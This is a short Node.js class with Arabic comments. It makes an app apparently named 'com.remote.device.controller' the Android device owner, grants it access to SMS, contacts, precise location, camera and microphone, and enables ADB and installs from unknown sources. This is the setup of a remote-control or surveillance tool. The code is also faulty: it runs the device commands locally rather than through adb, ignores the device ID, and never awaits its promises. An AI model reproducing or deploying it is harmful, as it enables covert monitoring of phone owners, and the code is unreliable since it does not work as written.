class PermissionGranter {
  constructor(deviceId) {
    this.deviceId = deviceId;
  }

  grantAllPermissions() {
    try {
      // منح أذونات المسؤول
      this.enableDeviceAdmin();
      
      // منح الأذونات التشغيلية
      this.grantRuntimePermissions();
      
      // تمكين خيارات المطور
      this.enableDeveloperOptions();
      
      return true;
    } catch (error) {
      console.error('فشل في منح الصلاحيات:', error);
      return false;
    }
  }

  enableDeviceAdmin() {
    // تنفيذ أوامر ADB لمنح صلاحيات المسؤول
    this.executeShellCommand(
      'dpm set-device-owner com.remote.device.controller/.AdminReceiver'
    );
  }

  grantRuntimePermissions() {
    const permissions = [
      'READ_CONTACTS',
      'READ_SMS',
      'ACCESS_FINE_LOCATION',
      'CAMERA',
      'RECORD_AUDIO',
      'WRITE_EXTERNAL_STORAGE'
    ];
    
    permissions.forEach(perm => {
      this.executeShellCommand(
        `pm grant com.remote.device.controller android.permission.${perm}`
      );
    });
  }

  enableDeveloperOptions() {
    const commands = [
      'settings put global development_settings_enabled 1',
      'settings put global adb_enabled 1',
      'settings put global stay_on_while_plugged_in 3',
      'settings put secure install_non_market_apps 1'
    ];
    
    commands.forEach(cmd => this.executeShellCommand(cmd));
  }

  executeShellCommand(cmd) {
    // تنفيذ أوامر ADB مباشرة
    const exec = require('child_process').exec;
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) reject(error);
        else resolve(stdout);
      });
    });
  }
}

module.exports = PermissionGranter;